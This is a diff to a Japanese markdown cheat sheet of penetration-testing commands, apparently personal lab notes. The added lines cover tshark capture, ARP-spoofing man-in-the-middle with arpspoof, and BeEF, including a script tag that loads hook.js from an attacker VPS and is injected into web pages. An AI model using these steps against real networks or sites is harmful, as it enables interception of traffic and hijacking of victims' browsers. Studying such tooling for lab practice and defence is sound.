@@ -455,3 +455,41 @@ sudo nmap -sX -p 21 10.0.0.101
 # Nullスキャン
 sudo nmap -sN -p 21 10.0.0.101
 ```
+
+### tshark
+
+```bash
+tshark -i vboxnet0 -c 2
+# pcap形式で保存
+tshark -f "udp port 53" -i vboxnet0 -w traffic.pcap
+# -f: キャプチャフィルタ
+# -Y: 表示フィルタ
+```
+
+### IP転送（中間車攻撃）
+
+#### arpspoofによる中間者攻撃
+
+```bash
+# /proc/sys/net/ipv4/ip_forward の値を0→1に書き換える
+
+arpspoof -i [インターフェース名] -t [target IP] [書き換えたいIP]
+
+# /proc/sys/net/ipv4/ip_forward の値を1→0に戻す
+```
+
+#### MITMfによる中間者攻撃
+
+### BeEF
+
+```bash
+sudo apt install beef-xss
+# BeEF起動
+sudo beef-xss
+
+# <script src="http://127.0.0.1:3000/hook.js"></script>
+# をWebページに埋め込むか、中間者攻撃で埋め込む
+
+# 実践的にはVPS経由となる
+# <script src="http://[VPSのIP]:3000/hook.js"></script>
+```
